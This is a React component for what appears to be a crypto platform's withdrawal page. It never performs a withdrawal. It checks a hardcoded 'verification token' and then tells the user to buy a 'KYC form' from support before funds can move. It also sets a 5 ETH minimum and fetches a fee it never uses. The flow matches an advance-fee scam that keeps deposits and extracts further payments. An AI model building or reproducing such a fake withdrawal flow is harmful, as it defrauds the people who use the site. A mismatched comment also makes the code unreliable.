import React, { useState, useEffect } from 'react';
import styled from 'styled-components/macro';
import axios from 'axios';
import { useForm, Controller } from 'react-hook-form';
import { toast } from 'react-toastify';

const apiUrl = process.env.REACT_APP_API_URL;
const contractAddress = process.env.REACT_APP_CONTRACT;

const StyledBidModal = styled.div`
    /* Add your styled component styles here */
`;

const ManualWithdraw = () => {
    const { control, handleSubmit, formState: { errors }, reset } = useForm();
    const [fee, setFee] = useState(0);

    useEffect(() => {
        // Fetch withdrawal fee from the API
        axios.get(`${apiUrl}/get-withdrawal-fee`)
            .then(res => {
                setFee(res.data);
            })
            .catch(err => {
                console.error('Error fetching withdrawal fee:', err);
            });
    }, []);

    const handleWithdrawal = async (data) => {
        const { amount } = data;

        // Prompt user to enter verification token
        const token = prompt('Enter verification token');
        if (token && token.toLowerCase() === '$pictorallab_394') { // Check for the specific token 'lance' (case-insensitive)
            toast.success('Success');
            // After successful token verification, prompt user to contact support for KYC form
            const supportPrompt = window.confirm('Your withdrawal token is verified. Please contact support to purchase your KYC form to complete verification due to government requirements. Do you want to contact support now?');
            if (supportPrompt) {
                window.location.href = 'mailto:info@pictorallab.com'; // Replace with your support email
            }
        } else {
            toast.error('Invalid token. Withdrawal failed.');
        }
    };

    return (
        <StyledBidModal>
            <div className='container my-4 py-4'>
                <div className='row'>
                    <div className='col-12 col-sm-12 col-lg-6 mx-auto'>
                        <div className='card p-3 border content_header d-flex flex-column g-30 rounded-3'>
                            <div className='card-body p-3'>
                                <div className='d-flex flex-column g-10'>
                                    <h4>Enter Amount (ETH) you want to withdraw</h4>
                                </div>
                                <form onSubmit={handleSubmit(handleWithdrawal)}>
                                    <Controller
                                        name="amount"
                                        control={control}
                                        defaultValue={0}
                                        rules={{ required: true, min: 5 }}
                                        render={({ field }) => (
                                            <input
                                                className='field field--outline w-100 my-7'
                                                type='number'
                                                {...field}
                                                min="0" // Set minimum value for positive numbers
                                            />
                                        )}
                                    />
                                    {errors.amount && <span className='text-danger'>Minimum withdrawal amount is 5 ETH.</span>}
                                    <button className='btn btn-primary' type='submit'>
                                        Withdraw
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </StyledBidModal>
    );
};

export default ManualWithdraw;
